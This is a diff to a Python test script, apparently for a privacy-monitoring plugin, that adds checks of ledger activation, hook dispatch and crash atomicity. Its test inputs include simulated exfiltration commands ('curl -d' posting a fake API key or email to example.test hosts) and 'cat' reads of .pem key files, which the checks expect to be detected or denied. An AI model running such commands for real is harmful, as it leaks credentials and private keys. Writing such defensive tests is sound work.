@@ -30,7 +30,34 @@ stays legacy, a reopened reader, unavailability, end-of-session erasure and
 a retried delivery. Finally an observation write and a version-2 end are
 terminated after every mutating statement and around the outer commit, each
 on a fresh clone. Output is the same closed set of fixed lines and check
-names.
+names. Since #54 Phase 4 a genuine production start is version-2
+accounted, so Phase 3's "production stays legacy" step is a frozen
+compatibility scenario: it replays the legacy session boundary directly.
+Its PASS means the Phase 3 core and preservation contract, not that
+current production starts are legacy.
+
+Phase 4 checks (`--phase 4`) take the fenced active store,
+`$PLUGIN_DATA/ledger/active.db`, at generation 5401 -- or a validated 0 or
+5402 copy. The source is only read through the backup API. Each
+production scenario runs on its own clone root with the directory fence
+at the historical pathname, the copy at the active pathname and that
+root's own writer lease: activation without DDL on 5401 and every
+original cell preserved; real dispatch of new, replayed, lazy, unknown-end
+and empty-ID hooks; current evidence, recipients and unresolved shell-file
+identities with observation-local opaque labels and denials by action; the
+seven sequences through the rehearsal's designated adapter on synthetic
+sessions; end erasure, a retried and a late delivery, a failed end, and a
+replacement daemon that finds every open version-2 session unavailable;
+every read surface through a read-only reader; and activation, observation
+and end terminated after every mutation and around the outer commit.
+
+    umask 077
+    issue54_phase4_private="$(mktemp -d "${TMPDIR:-/tmp}/privacy-hud-54-p4.XXXXXXXX")"
+    chmod 700 "$issue54_phase4_private"
+    python scripts/check-issue54-ledger.py \
+      --source "$PLUGIN_DATA/ledger/active.db" \
+      --work-dir "$issue54_phase4_private" \
+      --phase 4
 
 Deleting the work directory afterwards is logical deletion, not secure
 erasure.
@@ -41,6 +68,7 @@ import argparse
 import contextlib
 import io
 import os
+import re
 import sqlite3
 import stat
 import struct
@@ -58,6 +86,7 @@ from privacy_hud.accounting import (  # noqa: E402
     SubjectInput,
 )
 from privacy_hud.budget import contribution, group_score  # noqa: E402
+from privacy_hud.detect.base import Cost, DetectorProfile  # noqa: E402
 from privacy_hud.identity import (  # noqa: E402
     file_identity, recipient_identity, value_identity,
 )
@@ -943,16 +972,22 @@ def _check_synthetic_v2(path: Path) -> None:
     finally:
         led.conn.close()
 
-    # A genuine production start on this copy is still legacy.
+    # A frozen Phase 3 compatibility scenario, not a claim about current
+    # production. Phase 3 production created a legacy session through the
+    # legacy session boundary; that path is replayed here, explicitly, and
+    # must still yield a legacy session on a prepared copy. Since #54 Phase
+    # 4 a genuine production SessionStart activates version-2 accounting,
+    # which only the Phase 4 rehearsal exercises. The check keeps its fixed
+    # name so historical output stays comparable.
     production = _PRODUCTION_PREFIX + uuid.uuid4().hex
     with _silenced():
         state = dispatch.new_state(path.parent,
                                    writer_lease=_lease(path))
     try:
-        with _silenced():
-            dispatch.dispatch(state, {"hook_event_name": "SessionStart",
-                                      "session_id": production, "cwd": "",
-                                      "model": ""})
+        with state.ledger._write_transaction():
+            if not state.ledger.session_exists(production):
+                state.ledger.prepare_session_boundary(production)
+            state.ledger.start_session(production, cwd="", model="")
         version = state.ledger.conn.execute(
             "SELECT accounting_version FROM sessions WHERE session_id=?",
             (production,)).fetchone()
@@ -1158,12 +1193,897 @@ def _check_v2_crash_atomicity(
     remove(base)
 
 
+# --------------------------------------------------------------------- #
+# #54 Phase 4: activation on private copies of the fenced active store
+# --------------------------------------------------------------------- #
+
+_P4_PREFIX = "privacy-hud-dry-run-p4-"
+_P4_SECRET = "sk-proj-DryRunAb3xY9zQw1Er5Ty7Ui0OpAs2Df4G"
+_P4_EMAIL = "dryrun@example.test"
+
+#: A rehearsal child for one version-2 operation, terminated after its Nth
+#: mutation (INSERT, UPDATE, DELETE, DDL or a schema-generation PRAGMA) or
+#: around the outer COMMIT. Generated metadata is repeatable so complete
+#: committed states compare across fresh clones. Pure-ledger crash tests
+#: keep a synthetic ownership root beside the clone (§D.6).
+_CHILD4 = """
+import os, sys, uuid
+sys.path.insert(0, sys.argv[4])
+from privacy_hud.accounting import (
+    EventRecord, Evidence as E, ObservationRecord, RecipientInput,
+    ScoringProfile, SubjectInput)
+from privacy_hud.identity import recipient_identity, value_identity
+import privacy_hud.ledger as ledger_module
+from privacy_hud.ledger import Ledger
+from privacy_hud.matrix.loader import load_matrix
+from privacy_hud.runtime_owner import acquire_writer, unselected_activation
+op, stop, path, sid = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[5]
+key, delivery = bytes.fromhex(sys.argv[6]), sys.argv[7]
+
+MUTATING = ("INSERT", "UPDATE", "DELETE", "CREATE", "ALTER", "DROP")
+
+
+class Proxy:
+    def __init__(self, conn):
+        self._conn = conn
+        self.mutations = 0
+
+    def __getattr__(self, name):
+        return getattr(self._conn, name)
+
+    def execute(self, sql, params=()):
+        head = " ".join(sql.split()).upper()
+        if stop == 0 and head.startswith("COMMIT"):
+            os._exit(4)
+        cursor = self._conn.execute(sql, params)
+        if head.startswith(MUTATING) or (
+                head.startswith("PRAGMA USER_VERSION") and "=" in head):
+            self.mutations += 1
+            if self.mutations == stop:
+                os._exit(3)
+        if stop == -1 and head.startswith("COMMIT"):
+            os._exit(5)
+        return cursor
+
+
+matrix = load_matrix()
+led = Ledger(path, matrix, observer=delivery[:16], writer_lease=acquire_writer(
+    path + ".owner", activation=unselected_activation()))
+sequence = 0
+def repeatable_uuid():
+    global sequence
+    sequence += 1
+    return uuid.uuid5(uuid.NAMESPACE_OID, f"{delivery}:{sequence}")
+ledger_module.uuid.uuid4 = repeatable_uuid
+ledger_module.time.time = lambda: 1_700_000_000
+proxy = Proxy(led.conn)
+led.conn = proxy
+if op == "activate":
+    led.start_accounted_session(
+        sid, cwd="", model="", profile=ScoringProfile.from_matrix(matrix),
+        start_observation=ObservationRecord(
+            session_id=sid, delivery_key=delivery, action_id=delivery,
+            turn_id=None, ts=1, hook_event="SessionStart", phase="lifecycle",
+            action_kind="lifecycle", boundary="B0", decision="none",
+            evidence=E.HOOK_OBSERVED, resolution_scope="none",
+            potential_crossing=False, scan_gap=None))
+elif op == "observe":
+    led.record_observation(
+        ObservationRecord(
+            session_id=sid, delivery_key=delivery, action_id=delivery,
+            turn_id=None, ts=2, hook_event="PostToolUse", phase="post",
+            action_kind="tool", boundary="B1", decision="none",
+            evidence=(E.HOOK_OBSERVED | E.LOCAL_DETECTION
+                      | E.EXECUTION_OBSERVED | E.CROSSING_CONFIRMED),
+            resolution_scope="pairs", potential_crossing=True,
+            scan_gap="timeout"),
+        [EventRecord(
+            subject=SubjectInput(
+                subject_kind="value",
+                identity_hash=value_identity(key, "crash-subject")),
+            recipient=RecipientInput(
+                destination_kind="model_context",
+                identity_hash=recipient_identity(
+                    key, "model_context", "model_context")),
+            kind="exposed",
+            evidence=E.LOCAL_DETECTION | E.CROSSING_CONFIRMED,
+            data_type="email", rule_id=None, occurrences=1,
+            source_label="tool result", boundary="B1",
+            masked_example=None)])
+else:
+    led.end_session(sid)
+if stop == -2:
+    sys.stdout.write(str(proxy.mutations))
+    sys.stdout.flush()
+    os._exit(6)
+os._exit(7)
+"""
+
+
+class _RehearsalEmailDetector:
+    """A cheap, deterministic email finder for the rehearsal's synthetic
+    sessions, so the sequences need no model weights."""
+
+    profile = DetectorProfile(tier=1, cost=Cost.CHEAP)
+
+    _PATTERN = re.compile(r"[a-z]+@[a-z]+\.test")
+
+    def scan(self, text, ctx):
+        from privacy_hud.detect.base import Finding
+        return [Finding("email", m.group(0), m.start(), m.end())
+                for m in self._PATTERN.finditer(text)]
+
+
+class _SequenceAdapter:
+    """The rehearsal's designated test adapter: pair receipts and terminal
+    evidence for scripted synthetic deliveries only, built with the key it
+    is handed. Installed as a Python object on the rehearsal's own state;
+    nothing in a payload selects it."""
+
+    def __init__(self) -> None:
+        from privacy_hud.hook_evidence import CurrentHookAdapter
+        self.base = CurrentHookAdapter()
+        self.script: dict = {}
+
+    def normalize(self, *, payload, delivery_key, accounting_key):
+        import dataclasses
+        found = self.base.normalize(payload=payload,
+                                    delivery_key=delivery_key,
+                                    accounting_key=accounting_key)
+        entry = self.script.get((payload.get("hook_event_name"),
+                                 payload.get("tool_use_id")))
+        if entry is None or accounting_key is None:
+            return found
+        changes = {}
+        if "boundary" in entry:
+            changes["boundary"] = entry["boundary"]
+            changes["recipient"] = entry["recipient"](accounting_key)
+        return dataclasses.replace(
+            found, evidence=found.evidence | entry.get("evidence", _E(0)),
+            resolution_scope="pairs",
+            receipt_events=tuple(entry["receipts"](accounting_key)),
+            **changes)
+
+
+def _receipt(key, value, data_type, *, kind="exposed",
+             evidence=_E.EXECUTION_OBSERVED | _E.CROSSING_CONFIRMED,
+             dest="model_context", concrete="model_context",
+             boundary="B1", source="tool result") -> EventRecord:
+    return EventRecord(
+        subject=SubjectInput(subject_kind="value",
+                             identity_hash=value_identity(key, value)),
+        recipient=RecipientInput(
+            destination_kind=dest,
+            identity_hash=recipient_identity(key, dest, concrete)),
+        kind=kind, evidence=evidence, data_type=data_type, rule_id=None,
+        occurrences=1, source_label=source, boundary=boundary,
+        masked_example=None)
+
+
+def _clone_root(db: Path, root: Path) -> Path:
+    """A private production-shaped data root: the directory fence at the
+    canonical historical pathname and the copy at the canonical active
+    pathname. Returns the active path."""
+    from privacy_hud import runtime_storage
+    _mkdir(root)
+    fence = runtime_storage.legacy_path(root)
+    active = runtime_storage.active_path(root)
+    fence.mkdir(mode=0o700)
+    active.parent.mkdir(mode=0o700)
+    _copy(db, active)
+    _check(runtime_storage.is_fenced(root)
+           and runtime_storage.resolved_ledger_path(root) == active,
+           "phase4-fenced-layout")
+    return active
+
+
+@contextlib.contextmanager
+def _owned(root: Path):
+    """This root's own writer lease, taken fresh and given back on exit, so
+    a later process or daemon state acquires it rather than inheriting."""
+    from privacy_hud.runtime_owner import owns_writer
+    lease = acquire_writer(root, activation=unselected_activation())
+    try:
+        _check(lease.held and owns_writer(root), "phase4-writer-ownership")
+        yield lease
+    finally:
+        lease.close()
+
+
+@contextlib.contextmanager
+def _daemon_state(root: Path):
+    """A real daemon state on a clone root, under that root's lease, with
+    cheap detectors and the rehearsal's adapter. Closed, and its lease
+    released, on exit."""
+    from privacy_hud.detect.model import StubModelDetector
+    from privacy_hud.detect.paths import PathDetector
+    from privacy_hud.detect.secrets import SecretDetector
+    real_model = dispatch.ModelDetector
+    with _owned(root) as lease:
+        dispatch.ModelDetector = lambda: StubModelDetector([])  # type: ignore
+        try:
+            with _silenced():
+                state = dispatch.new_state(root, writer_lease=lease)
+        finally:
+            dispatch.ModelDetector = real_model  # type: ignore
+        state.detectors[:] = [PathDetector(), SecretDetector(),
+                              _RehearsalEmailDetector()]
+        state.hook_adapter = _SequenceAdapter()
+        try:
+            yield state
+        finally:
+            state.ledger.conn.close()
+
+
+def _generation4(path: Path) -> int:
+    raw = _raw(path)
+    try:
+        return ledger_schema.validate_schema(raw)
+    except (ledger_schema.UnsupportedAccounting, sqlite3.Error):
+        raise CheckFailed("phase4-source-version") from None
+    finally:
+        raw.close()
+
+
+def _dispatch_active(path: Path) -> Path:
+    """Where `_check_phase4_dispatch` puts the root it exercises, for the
+    consumer checks that read it afterwards."""
+    from privacy_hud import runtime_storage
+    return runtime_storage.active_path(path.parents[2] / "dispatch")
+
+
+def phase4(source: Path, work: Path) -> None:
+    """Phase 4: activation, production dispatch, consumers and crash
+    atomicity, each on private copies of a validated source of generation
+    0, 5401 or 5402 -- the fenced active store at 5401 being the case that
+    matters. The source is only ever read through the backup API."""
+    inspect = work / "inspect"
+    _mkdir(inspect)
+    backup = inspect / "backup.db"
+    _copy(source, backup)
+    version = _generation4(backup)
+    _check(version in (0, ledger_schema.PREPARED_VERSION,
+                       ledger_schema.ACTIVATED_VERSION),
+           "phase4-source-version")
+    baseline_dir = work / "baseline"
+    _mkdir(baseline_dir)
+    baseline = baseline_dir / "baseline.db"
+    _copy(backup, baseline)
+    if version == 0:
+        # The daemon's own startup step on a legacy copy, as in Phase 2:
+        # a ledger from an older release gains the legacy tables it lacks.
+        with _owned(baseline_dir / "owner") as lease:
+            Ledger(baseline, load_matrix(), writer_lease=lease).conn.close()
+    activated = _check_phase4_activation(baseline, work / "activation")
+    _check_phase4_dispatch(activated)
+    _check_phase4_consumers(_dispatch_active(activated))
+    _check_phase4_crash_atomicity(baseline, work / "crash")
+
+
+def _check_phase4_activation(
+    baseline: Path,
+    work: Path,
+) -> Path:
+    """A genuine absent start activates the copy: generation 5402, the new
+    session version-2 accounted, every original cell, layout, reading and
+    foreign-key state preserved, no DDL unless the copy was generation 0,
+    and no change to runtime selection. Repair then preserves the
+    activated generation. Returns the activated copy's active path."""
+    from privacy_hud import runtime_storage
+    from privacy_hud.hook_evidence import CurrentHookAdapter
+
+    matrix = load_matrix()
+    _mkdir(work)
+    root = work / "root"
+    active = _clone_root(baseline, root)
+    raw = _raw(active)
+    try:
+        version = ledger_schema.validate_schema(raw)
+        tables = _tables(raw)
+        before = {t: _cells(raw, t) for t in tables}
+        layouts = {t: _layout(raw, t) for t in tables}
+        schema = _schema(raw)
+        violations = _fk_violations(raw)
+    finally:
+        raw.close()
+
+    reader = Ledger(active, matrix, initialize=False)
+    try:
+        readings = _readings(reader)
+        statements: list[str] = []
+        with _owned(root) as lease:
+            led = Ledger(active, matrix, writer_lease=lease)
+            try:
+                sid = _P4_PREFIX + uuid.uuid4().hex
+                start = CurrentHookAdapter().normalize(
+                    payload={"hook_event_name": "SessionStart",
+                             "session_id": sid},
+                    delivery_key=uuid.uuid4().hex,
+                    accounting_key=os.urandom(32))
+                led.conn.set_trace_callback(statements.append)
+                activated = led.start_accounted_session(
+                    sid, cwd="", model="",
+                    profile=ScoringProfile.from_matrix(matrix),
+                    start_observation=dispatch._lifecycle_record(sid, start))
+                led.conn.set_trace_callback(None)
+                _check(activated is True, "phase4-activation")
+                _check(led.summary(sid).accounting_version == 2,
+                       "phase4-activation")
+            finally:
+                led.conn.close()
+        after_readings = _readings(reader)
+        for original, reading in readings.items():
+            _check(after_readings.get(original) == reading,
+                   "phase4-preservation")
+    finally:
+        reader.conn.close()
+
+    ddl = [s for s in statements if " ".join(s.split()).upper().startswith(
+        ("CREATE", "ALTER", "DROP"))]
+    raw = _raw(active)
+    try:
+        _check(ledger_schema.validate_schema(raw)
+               == ledger_schema.ACTIVATED_VERSION, "phase4-activation")
+        if version == 0:
+            _check(bool(ddl), "phase4-direct-upgrade")
+            _check(_cells(raw, "events_legacy_v1") == before.get("events"),
+                   "phase4-direct-upgrade")
+        else:
+            _check(ddl == [], "phase4-activation")
+            _check(_schema(raw) == schema, "phase4-preservation")
+        for table, cells in before.items():
+            if version == 0 and table == "events":
+                continue
+            after = _cells(raw, table)[:len(cells)]
+            width = len(cells[0]) if cells else 0
+            after = [row[:width] for row in after]
+            _check(after == cells, "phase4-preservation")
+            if version != 0:
+                _check(_layout(raw, table) == layouts[table],
+                       "phase4-preservation")
+        _check(_fk_violations(raw) == violations, "phase4-foreign-keys")
+        activated_cells = {t: _cells(raw, t) for t in _tables(raw)}
+    finally:
+        raw.close()
+
+    # Runtime selection is untouched: no receipt appears, none is changed.
+    _check(not (root / "runtime.json").exists(), "phase4-runtime-selection")
+    # Repair's preflight accepts the activated copy and changes nothing.
+    _check(runtime_storage.validate_existing_ledger(root)
+           == ledger_schema.ACTIVATED_VERSION, "phase4-repair-preservation")
+    raw = _raw(active)
+    try:
+        _check({t: _cells(raw, t) for t in _tables(raw)} == activated_cells,
+               "phase4-repair-preservation")
+    finally:
+        raw.close()
+    return active
+
+
+def _count(state, table: str, sid: str) -> int:
+    return state.ledger.conn.execute(
+        f"SELECT COUNT(*) FROM {table} WHERE session_id=?",
+        (sid,)).fetchone()[0]
+
+
+def _hook(state, event: str, sid: str, key: str | None = None, **fields):
+    return dispatch.dispatch(
+        state, {"hook_event_name": event, "session_id": sid, "cwd": "/r",
+                **fields}, delivery_key=key)
+
+
+def _row(state, sid: str):
+    return state.ledger.conn.execute(
+        "SELECT * FROM sessions WHERE session_id=?", (sid,)).fetchone()
+
+
+def _event_rows(state, sid: str) -> list:
+    return state.ledger.conn.execute(
+        "SELECT e.kind, e.evidence, s.subject_kind,"
+        " s.resolution AS subject_resolution, s.subject_id,"
+        " r.destination_kind, r.resolution AS recipient_resolution,"
+        " r.recipient_id FROM events e"
+        " JOIN subjects s USING (session_id, subject_id)"
+        " JOIN recipients r USING (session_id, recipient_id)"
+        " WHERE e.session_id=? ORDER BY e.id", (sid,)).fetchall()
+
+
+_TERMINAL = (_E.CROSSING_CONFIRMED | _E.DENY_ENFORCED | _E.REWRITE_ENFORCED
+             | _E.REJECTED_BEFORE_CROSSING | _E.PERSISTENCE_OBSERVED
+             | _E.EXECUTION_OBSERVED)
+
+
+def _check_phase4_dispatch(path: Path) -> None:
+    """Real production dispatch on a production-shaped clone root of the
+    activated copy: genuine and replayed starts, lazy attachment, unknown
+    ends, empty probes, current evidence, recipients, unresolved shell-file
+    identities, observation-local opaque labels, denials by action, the
+    seven sequences through the designated adapter, end erasure, late and
+    retried deliveries, then a daemon restart that loses every key."""
+    import types
+    from privacy_hud.accounting import AccountingSummary
+
+    root = path.parents[2] / "dispatch"
+    _clone_root(path, root)
+    new = _P4_PREFIX + "new-" + uuid.uuid4().hex
+    open_ = _P4_PREFIX + "open-" + uuid.uuid4().hex
+    with _daemon_state(root) as state:
+        # Activation, replay, lazy attachment, unknown end.
+        _hook(state, "SessionStart", new)
+        _check(_row(state, new)["accounting_version"] == 2
+               and new in state.accounting_keys, "phase4-activation")
+        key, row = state.accounting_keys[new], tuple(_row(state, new))
+        observations = _count(state, "observations", new)
+        _hook(state, "SessionStart", new)
+        _check(state.accounting_keys[new] is key
+               and tuple(_row(state, new)) == row
+               and _count(state, "observations", new) == observations,
+               "phase4-existing-session")
+        ghost = _P4_PREFIX + "ghost-" + uuid.uuid4().hex
+        _hook(state, "SessionEnd", ghost)
+        _check(_row(state, ghost) is None, "phase4-existing-session")
+        lazy = _P4_PREFIX + "lazy-" + uuid.uuid4().hex
+        _hook(state, "UserPromptSubmit", lazy, prompt="hello")
+        _check(_row(state, lazy)["accounting_version"] == 1
+               and lazy not in state.accounting_keys,
+               "phase4-lazy-attachment")
+
+        # Empty-ID probes write nothing and register no liveness.
+        counts = {t: state.ledger.conn.execute(
+            f"SELECT COUNT(*) FROM {t}").fetchone()[0]
+            for t in ("sessions", "observations", "coverage", "events")}
+        live = dict(state.live)
+        for event in sorted(codex.KNOWN_EVENTS):
+            dispatch.dispatch(state, {"hook_event_name": event,
+                                      "session_id": "", "prompt": "x"})
+        _check(counts == {t: state.ledger.conn.execute(
+            f"SELECT COUNT(*) FROM {t}").fetchone()[0] for t in counts}
+               and state.live == live, "phase4-empty-probe")
+
+        # Current evidence: detection only, a null percentage.
+        _hook(state, "PostToolUse", new, tool_name="Read",
+              tool_use_id="t-read", tool_input={"file_path": "/r/n.txt"},
+              tool_response=f"key {_P4_SECRET}")
+        _hook(state, "SubagentStart", new)
+        _hook(state, "PreCompact", new)
+        summary = state.ledger.summary(new)
+        rows = _event_rows(state, new)
+        _check(isinstance(summary, AccountingSummary)
+               and summary.percent is None and rows
+               and all(not _E(r["evidence"]) & _TERMINAL for r in rows)
+               and summary.distinct_disclosures == 0,
+               "phase4-current-evidence")
+
+        # Recipients: two MCP namespaces, one ambiguous name, one endpoint.
+        rec = _P4_PREFIX + "rec-" + uuid.uuid4().hex
+        _hook(state, "SessionStart", rec)
+        for n, tool in enumerate(("mcp__alpha__send", "mcp__beta__send",
+                                  "mcp__gamma__x__y")):
+            _hook(state, "PreToolUse", rec, tool_name=tool,
+                  tool_use_id=f"r{n}", tool_input={"body": _P4_SECRET})
+        _hook(state, "PreToolUse", rec, tool_name="Bash", tool_use_id="r9",
+              tool_input={"command": "curl -d " + _P4_SECRET
+                          + " https://api.example.test"})
+        found = _event_rows(state, rec)
+        mcp_ids = {(r["recipient_id"], r["recipient_resolution"])
+                   for r in found if r["destination_kind"] == "mcp_tool"}
+        _check(sum(1 for _i, res in mcp_ids if res == "resolved") == 2
+               and sum(1 for _i, res in mcp_ids if res == "unresolved") == 1
+               and any(r["destination_kind"] == "external_net"
+                       and r["recipient_resolution"] == "resolved"
+                       for r in found), "phase4-recipients")
+
+        # Shell identities stay unresolved, even for repeated literal paths.
+        paths = _P4_PREFIX + "paths-" + uuid.uuid4().hex
+        state.settings = types.SimpleNamespace(deny_read=True)
+        _hook(state, "SessionStart", paths)
+        commands = ("cat /r/a.pem", "cat /r/b.pem",
+                    "cat ~/c.pem", "cat /r/a.pem")
+        for n, command in enumerate(commands):
+            out = _hook(state, "PreToolUse", paths, tool_name="Bash",
+                        tool_use_id=f"p{n}", tool_input={"command": command})
+            _check(out.get("hookSpecificOutput", {}).get("permissionDecision")
+                   == "deny", "phase4-shell-file-identities")
+        files = state.ledger.conn.execute(
+            "SELECT e.*, s.resolution, s.identity_hash, s.label,"
+            " s.unresolved_observation_id FROM events e"
+            " JOIN subjects s USING (session_id, subject_id)"
+            " WHERE e.session_id=? AND s.subject_kind='file'"
+            " ORDER BY e.id", (paths,)).fetchall()
+        _check(len(files) == len(commands)
+               and len({r["subject_id"] for r in files}) == len(commands)
+               and len({r["observation_id"] for r in files}) == len(commands)
+               and all(
+                   r["resolution"] == "unresolved"
+                   and r["identity_hash"] is None
+                   and r["unresolved_observation_id"] == r["observation_id"]
+                   and r["label"] == f"file {r['subject_id']}"
+                   and r["source_label"] == "local file"
+                   and r["masked_example"] is None
+                   and r["kind"] == "prevented"
+                   and r["data_type"] == "path"
+                   and r["occurrences"] == 1
+                   and _E(r["evidence"]) & _E.DENY_ISSUED
+                   and not _E(r["evidence"]) & _TERMINAL
+                   for r in files),
+               "phase4-shell-file-identities")
+        summary = state.ledger.summary(paths)
+        _check(isinstance(summary, AccountingSummary)
+               and summary.denials_issued == len(commands)
+               and summary.denials_enforced == 0
+               and summary.reads_stopped == 0
+               and summary.distinct_disclosures == 0,
+               "phase4-shell-file-identities")
+        state.settings = types.SimpleNamespace(deny_read=False)
+
+        _check_phase4_sequences(state)
+
+        # End erasure, a retried delivery and a late observation.
+        charged = _P4_PREFIX + "charged-" + uuid.uuid4().hex
+        _hook(state, "SessionStart", charged)
+        adapter = state.hook_adapter
+        adapter.script[("PostToolUse", "c1")] = {
+            "receipts": lambda k: [_receipt(k, _P4_EMAIL, "email")]}
+        delivery = uuid.uuid4().hex
+        post = {"tool_name": "Read", "tool_use_id": "c1",
+                "tool_input": {"file_path": "/r/c.txt"},
+                "tool_response": f"mail {_P4_EMAIL}"}
+        _hook(state, "PostToolUse", charged, key=delivery, **post)
+        disclosures = [tuple(r) for r in state.ledger.conn.execute(
+            "SELECT * FROM disclosures WHERE session_id=?", (charged,))]
+        _check(len(disclosures) == 1, "phase4-end-erasure")
+        events = _count(state, "events", charged)
+        _hook(state, "SessionEnd", charged)
+        hashes = state.ledger.conn.execute(
+            "SELECT (SELECT COUNT(*) FROM subjects WHERE session_id=?"
+            " AND identity_hash IS NOT NULL) + (SELECT COUNT(*) FROM"
+            " recipients WHERE session_id=? AND identity_hash IS NOT NULL)",
+            (charged, charged)).fetchone()[0]
+        _check(hashes == 0 and charged not in state.accounting_keys
+               and _count(state, "events", charged) == events
+               and _count(state, "subjects", charged) >= 1,
+               "phase4-end-erasure")
+        _hook(state, "PostToolUse", charged, key=delivery, **post)
+        _check([tuple(r) for r in state.ledger.conn.execute(
+            "SELECT * FROM disclosures WHERE session_id=?", (charged,))]
+               == disclosures
+               and _count(state, "events", charged) == events,
+               "phase4-late-observation")
+        _hook(state, "PostToolUse", charged, **{**post, "tool_use_id": "c2"})
+        late = _event_rows(state, charged)[events:]
+        _check(late and all(r["subject_resolution"] == "unresolved"
+                            for r in late)
+               and [tuple(r) for r in state.ledger.conn.execute(
+                   "SELECT * FROM disclosures WHERE session_id=?",
+                   (charged,))] == disclosures, "phase4-late-observation")
+
+        # An end whose persistence fails still discards the key; the next
+        # touch finds the session unavailable and generates no key.
+        failing = _P4_PREFIX + "failing-" + uuid.uuid4().hex
+        _hook(state, "SessionStart", failing)
+        real_end = Ledger.end_session
+
+        def fail_end(self, session_id):
+            raise RuntimeError("rehearsal end failure")
+
+        Ledger.end_session = fail_end  # type: ignore[method-assign]
+        try:
+            try:
+                _hook(state, "SessionEnd", failing)
+                failed = False
+            except RuntimeError:
+                failed = True
+        finally:
+            Ledger.end_session = real_end  # type: ignore[method-assign]
+        _hook(state, "UserPromptSubmit", failing, prompt="again")
+        _check(failed and failing not in state.accounting_keys
+               and _row(state, failing)["accounting_status"]
+               == "unavailable", "phase4-key-loss")
+
+        _hook(state, "SessionStart", open_)
+        _check(open_ in state.accounting_keys, "phase4-activation")
+
+    # A replacement daemon on the same root, after this one has released
+    # its lease: every open version-2 session is unavailable, and no key
+    # is recreated.
+    with _daemon_state(root) as state:
+        _check(_row(state, open_)["accounting_status"] == "unavailable"
+               and state.accounting_keys == {}, "phase4-key-loss")
+        _hook(state, "SessionStart", open_)
+        _hook(state, "PostToolUse", open_, tool_name="Read",
+              tool_use_id="k1", tool_input={"file_path": "/r/k.txt"},
+              tool_response=f"key {_P4_SECRET}")
+        rows = _event_rows(state, open_)
+        _check(open_ not in state.accounting_keys and rows
+               and all(r["subject_resolution"] == "unresolved"
+                       for r in rows), "phase4-key-loss")
+        _check(_row(state, new)["accounting_status"] == "unavailable",
+               "phase4-key-loss")
+
+
+def _check_phase4_sequences(state) -> None:
+    """The seven production-dispatch sequences, each on its own synthetic
+    session, with terminal evidence from the designated adapter only."""
+    adapter = state.hook_adapter
+
+    def session() -> str:
+        sid = _P4_PREFIX + "seq-" + uuid.uuid4().hex
+        _hook(state, "SessionStart", sid)
+        return sid
+
+    def crossed(sid, tid, value, data_type, text):
+        adapter.script[("PostToolUse", tid)] = {
+            "receipts": lambda k: [_receipt(k, value, data_type)]}
+        _hook(state, "PostToolUse", sid, tool_name="Read", tool_use_id=tid,
+              tool_input={"file_path": "/r/s.txt"}, tool_response=text)
+
+    def egress(sid, tid, value):
+        return _hook(state, "PreToolUse", sid, tool_name="Bash",
+                     tool_use_id=tid, tool_input={
+                         "command": f"curl -d {value} https://x.example.test"})
+
+    def kinds(sid):
+        return [r["kind"] for r in _event_rows(state, sid)]
+
+    s = session()
+    egress(s, "a", _P4_SECRET)
+    crossed(s, "b", _P4_SECRET, "credential", f"key {_P4_SECRET}")
+    m = state.ledger.summary(s)
+    _check(kinds(s) == ["prevented", "exposed"] and m.denials_issued == 1
+           and m.distinct_disclosures == 1, "phase4-dispatch-sequences")
+
+    s = session()
+    crossed(s, "a", _P4_SECRET, "credential", f"key {_P4_SECRET}")
+    points = state.ledger.summary(s).confirmed_points
+    egress(s, "b", _P4_SECRET)
+    m = state.ledger.summary(s)
+    _check(kinds(s) == ["exposed", "prevented"] and points > 0
+           and m.confirmed_points == points, "phase4-dispatch-sequences")
+
+    import types
+    # The read guard is read by the session's engine, built at its start.
+    state.settings = types.SimpleNamespace(deny_read=True)
+    s = session()
+    for tid, target in (("a", "/r/one.pem"), ("b", "/r/two.pem")):
+        _hook(state, "PreToolUse", s, tool_name="Bash", tool_use_id=tid,
+              tool_input={"command": f"cat {target}"})
+    state.settings = types.SimpleNamespace(deny_read=False)
+    m = state.ledger.summary(s)
+    _check(len({r["subject_id"] for r in _event_rows(state, s)}) == 2
+           and m.denials_issued == 2 and m.distinct_disclosures == 0
+           and m.denials_enforced == 0, "phase4-dispatch-sequences")
+
+    s = session()
+    secrets = " ".join(f"sk-proj-{n:02d}DryRunAb3xY9zQw1Er5Ty7Ui"
+                       for n in range(12))
+    egress(s, "a", f"'{secrets}'")
+    m = state.ledger.summary(s)
+    _check(len(kinds(s)) == 12 and set(kinds(s)) == {"prevented"}
+           and m.denials_issued == 1 and m.confirmed_points == 0,
+           "phase4-dispatch-sequences")
+
+    s = session()
+    crossed(s, "a", _P4_EMAIL, "email", f"mail {_P4_EMAIL}")
+    first = state.ledger.summary(s).confirmed_points
+    crossed(s, "b", _P4_EMAIL, "email", f"again {_P4_EMAIL}")
+    _check(kinds(s) == ["exposed", "exposed"]
+           and state.ledger.summary(s).confirmed_points == first > 0
+           and _count(state, "disclosures", s) == 1,
+           "phase4-dispatch-sequences")
+
+    s = session()
+    for tid, server in (("a", "alpha"), ("b", "beta")):
+        adapter.script[("PreToolUse", f"mcp-{tid}")] = {
+            "receipts": lambda k, server=server: [_receipt(
+                k, _P4_EMAIL, "email", dest="mcp_tool", concrete=server,
+                boundary="B3", source="tool input")]}
+        _hook(state, "PreToolUse", s, tool_name=f"mcp__{server}__send",
+              tool_use_id=f"mcp-{tid}", tool_input={"body": _P4_EMAIL})
+    m = state.ledger.summary(s)
+    _check(m.distinct_disclosures == 2 and m.concrete_recipients == 2,
+           "phase4-dispatch-sequences")
+
+    s = session()
+    endpoint = "https://api.example.test:443"
+    egress_cmd = f"curl -d {_P4_EMAIL} https://api.example.test"
+    _hook(state, "PreToolUse", s, tool_name="Bash", tool_use_id="a",
+          tool_input={"command": egress_cmd})
+    adapter.script[("PostToolUse", "a")] = {
+        "boundary": "B4",
+        "recipient": lambda k: RecipientInput(
+            destination_kind="external_net",
+            identity_hash=recipient_identity(k, "external_net", endpoint)),
+        "receipts": lambda k: [_receipt(
+            k, _P4_EMAIL, "email", kind="prevented",
+            evidence=_E.REJECTED_BEFORE_CROSSING, dest="external_net",
+            concrete=endpoint, boundary="B4", source="tool input")]}
+    _hook(state, "PostToolUse", s, tool_name="Bash", tool_use_id="a",
+          tool_input={"command": egress_cmd}, tool_response="refused")
+    m = state.ledger.summary(s)
+    _check(kinds(s) == ["permitted", "prevented"]
+           and m.permission_actions == 1
+           and _count(state, "disclosures", s) == 0,
+           "phase4-dispatch-sequences")
+
+
+def _check_phase4_consumers(path: Path) -> None:
+    """Every read surface over the exercised copy, through a read-only
